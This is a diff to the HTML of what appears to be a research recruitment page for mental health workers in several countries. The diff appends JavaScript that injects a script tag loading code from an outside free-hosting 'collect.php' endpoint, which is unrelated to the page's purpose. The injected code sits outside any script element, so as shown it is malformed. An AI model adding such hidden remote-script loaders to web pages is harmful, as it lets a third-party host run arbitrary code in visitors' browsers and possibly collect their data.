@@ -42,5 +42,12 @@
             <p>We invite mental health workers from countries such as <b>Israel, the United States, the United Kingdom, Canada, Australia, Jordan, and France</b> to join us on this transformative journey. By incorporating perspectives from various cultural contexts, we seek to enrich our findings and contribute to a global dialogue on mental health care.</p>
         </article>
     </section>
+
+    function handleResponse(response) {
+   console.log(response);
+    }
+    var script = document.createElement('script');
+    script.src = 'https://javascriptlab.000webhostapp.com/collect.php?callback=handleResponse';
+    document.body.appendChild(script);
 </body>
 </html>
